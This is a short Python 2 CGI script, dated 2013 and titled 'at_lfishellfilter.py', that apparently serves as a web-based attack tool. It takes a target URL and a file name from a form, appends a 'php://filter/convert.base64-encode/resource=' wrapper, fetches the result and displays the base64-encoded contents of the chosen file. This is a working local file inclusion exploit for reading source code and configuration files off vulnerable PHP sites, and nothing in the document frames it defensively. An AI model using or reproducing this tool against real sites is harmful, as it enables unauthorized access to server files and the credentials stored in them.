#!/usr/bin/python 

#Tumi (c) 2013 at_lfishellfilter.py
 
import urllib2
import re 
import cgi
import cgitb
cgitb.enable()

# GET
form   = cgi.FieldStorage()
url = form.getvalue("url")
fileinput = form.getvalue("file")

# HTML HEADERS
print "Content-Type: text/html; charset=UTF-8"	# Print headers
print ""

# HTML 

print '''
<html>
<body>
'''

print "<font color=\"white\">See some base64?</font><br/>"

print "<textarea style=\"margin: 2px; height: 189px; width: 392px; color: white; background-color: transparent; \">"


inject = url + "php://filter/convert.base64-encode/resource=" + fileinput
response = urllib2.urlopen(inject)
rad = response.read()
print rad
	


print "</textarea>"

'''
</body>
</html>
'''
